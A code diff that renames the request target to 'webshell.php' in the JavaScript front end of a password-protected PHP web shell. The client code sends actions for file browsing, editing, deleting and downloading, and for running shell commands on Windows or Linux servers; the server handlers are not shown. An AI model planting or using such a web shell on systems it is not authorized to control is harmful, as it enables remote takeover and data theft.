@@ -417,7 +417,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         formData.append('action', 'login');
         formData.append('password', password);
 
-        fetch('versionfuncional.php', {
+        fetch('webshell.php', {
             method: 'POST',
             body: formData
         })
@@ -451,7 +451,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         formData.append('action', 'navigate');
         formData.append('folderName', folderName);
 
-        fetch('versionfuncional.php', {
+        fetch('webshell.php', {
             method: 'POST',
             body: formData
         })
@@ -512,7 +512,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         const formData = new FormData();
         formData.append('action', 'getFilesAndFolders');
 
-        fetch('versionfuncional.php', {
+        fetch('webshell.php', {
             method: 'POST',
             body: formData
         })
@@ -553,7 +553,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         formData.append('action', 'download');
         formData.append('fileName', fileName);
 
-        fetch('versionfuncional.php', {
+        fetch('webshell.php', {
             method: 'POST',
             body: formData
         })
@@ -575,7 +575,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         formData.append('action', 'edit');
         formData.append('fileName', fileName);
 
-        fetch('versionfuncional.php', {
+        fetch('webshell.php', {
             method: 'POST',
             body: formData
         })
@@ -601,7 +601,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         formData.append('content', content);
 
         // Send the FormData object to the server
-        fetch('versionfuncional.php', {
+        fetch('webshell.php', {
             method: 'POST',
             body: formData
         })
@@ -631,7 +631,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         formData.append('action', 'delete');
         formData.append('fileName', fileName);
 
-        fetch('versionfuncional.php', {
+        fetch('webshell.php', {
             method: 'POST',
             body: formData
         })
@@ -655,7 +655,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             formData.append('action', 'navigate');
             formData.append('path', path);
 
-            fetch('versionfuncional.php', {
+            fetch('webshell.php', {
                 method: 'POST',
                 body: formData
             })
@@ -703,7 +703,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         const formData = new FormData();
         formData.append('action', 'getHomePath');
 
-        fetch('versionfuncional.php', {
+        fetch('webshell.php', {
             method: 'POST',
             body: formData,
             headers: {
@@ -749,7 +749,7 @@ function executeCommand() {
 
     const commandEndpoint = isWindows() ? 'executeCommandWindows' : 'executeCommandLinux';
 
-    fetch('versionfuncional.php', {
+    fetch('webshell.php', {
         method: 'POST',
         body: formData
     })
